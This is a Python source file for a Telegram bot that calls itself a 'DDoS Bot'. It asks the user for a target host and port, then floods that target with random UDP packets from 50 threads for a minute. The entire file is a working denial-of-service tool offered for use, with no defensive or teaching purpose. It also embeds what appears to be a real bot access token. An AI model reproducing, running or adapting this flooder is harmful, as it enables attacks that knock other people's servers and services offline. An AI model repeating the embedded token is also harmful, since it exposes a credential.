import time
import socket
import random
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler

def run(ip, port, times, threads, stop_event):
    data = random._urandom(1024)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print("[*] UDP Sent!!!")
        except Exception as e:
            print(f"[!] Error: {e}")
            break
        finally:
            s.close()

def start_attack(ip, port, times=600, threads=50):
    stop_event = threading.Event()
    threads_list = []
    for _ in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads, stop_event))
        threads_list.append(th)
        th.start()

    time.sleep(60)  # Run the attack for 1 minute
    stop_event.set()  # Signal all threads to stop

    for th in threads_list:
        th.join()

    print("Attack finished.")

HOST, PORT = range(2)

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Welcome to the DDoS Bot! Please provide the following details:")
    await update.message.reply_text("Host/Ip:")
    return HOST

async def host(update: Update, context: CallbackContext):
    context.user_data["ip"] = update.message.text
    await update.message.reply_text("Port:")
    return PORT

async def port(update: Update, context: CallbackContext):
    try:
        port = int(update.message.text)
        if not (1 <= port <= 65535):
            raise ValueError("Port out of range")
        context.user_data["port"] = port
    except ValueError:
        await update.message.reply_text("Please enter a valid port number (1-65535):")
        return PORT

    await update.message.reply_text("Starting the attack. We always use UDP, Packets per one connection: 600, Threads: 50.")

    ip = context.user_data["ip"]
    start_attack(ip, port, times=600, threads=50)

    await update.message.reply_text(f"Attack on {ip}:{port} completed for 1 minute.")
    await update.message.reply_text("Host/Ip:")
    return HOST

async def stop(update: Update, context: CallbackContext):
    await update.message.reply_text("Bot stopped.")
    return ConversationHandler.END

async def cancel(update: Update, context: CallbackContext):
    await update.message.reply_text("Operation canceled.")
    return ConversationHandler.END

def main():
    token = "7908390858:AAG4l1DFXhd3q12HLmL7RvC6iZ-hgH1MKGU"

    application = Application.builder().token(token).build()

    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            HOST: [MessageHandler(filters.TEXT & ~filters.COMMAND, host)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("stop", stop), CommandHandler("cancel", cancel)],
    )

    application.add_handler(conversation_handler)
    application.run_polling()

if __name__ == '__main__':
    main()
